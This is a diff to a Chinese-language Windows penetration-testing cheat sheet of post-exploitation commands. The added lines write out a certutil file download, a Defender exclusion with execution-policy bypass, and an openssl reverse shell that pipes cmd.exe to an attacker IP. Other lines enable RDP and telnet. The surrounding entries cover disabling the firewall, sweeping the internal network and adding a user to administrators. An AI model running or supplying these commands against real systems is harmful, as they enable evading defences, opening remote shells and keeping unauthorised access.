@@ -48,7 +48,7 @@ netstat –ano
 
 ### 查看补丁信息
 ```
-Systeminfo
+systeminfo
 ```
 
 或者
@@ -56,6 +56,14 @@ Systeminfo
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 ```
 
+### 在某目录下的某些后缀文件中查找某文件内容
+```
+findstr /s /n /i /c:"class WebPage" "D:\xxx\yyy\*.cs"
+```
+### Windows下查看IIS的各个网站的目录以及配置信息
+```
+appcmd list site /config
+```
 
 ### 查看防火墙信息
 ```
@@ -72,6 +80,10 @@ Windows server 2003之后系统版本，命令如下：
 netsh advfirewall set allprofiles state off
 ```
 
+### 下载文件到某目录
+```
+certutil.exe -urlcache -split -f "https://www.baidu.com/" C:\baidu.txt
+```
 
 ### ICMP探测内网
 ```
@@ -81,4 +93,38 @@ for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.85.%I | findstr "TTL="
 ### 将自己加入管理员
 ```
 net localgroup administrators domain\username /add
+```
+
+### Defender排除某个目录：
+powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath "C:\Users\admin\Downloads"
+
+### Openssl.exe反弹shell：
+攻击者：
+```
+D:\Git\usr\bin\openssl.exe req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #生成证书
+D:\Git\usr\bin\openssl.exe s_server -quiet -key key.pem -cert cert.pem -port 80 #命令输入
+D:\Git\usr\bin\openssl.exe s_server -quiet -key key.pem -cert cert.pem -port 443 #命令输出
+```
+被控端：
+```
+D:\Git\usr\bin\openssl.exe s_client -quiet -connect IP:80|cmd.exe|D:\Git\usr\bin\openssl.exe s_client -quiet -connect IP:443
+```
+
+### Windows10下开启Telnet命令：
+
+```
+开启
+dism /online /Enable-Feature /FeatureName:TelnetClient
+关闭
+dism /online /Disable-Feature /FeatureName:TelnetClient
+```
+
+
+### 开启RDP
+```
+wmic RDTOGGLE WHERE ServerName='自己的hostname' call SetAllowTSConnections 0   //先关闭rdp
+netsh advfirewall firewall add rule name="RDP7" protocol=TCP dir=in localport=3389 action=allow
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp" /v "portnumber" /t REG_DWORD /d "3389" /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "portnumber" /t REG_DWORD /d "3389" /f
+wmic RDTOGGLE WHERE ServerName='自己的hostname' call SetAllowTSConnections 1  //再开启rdp
 ```
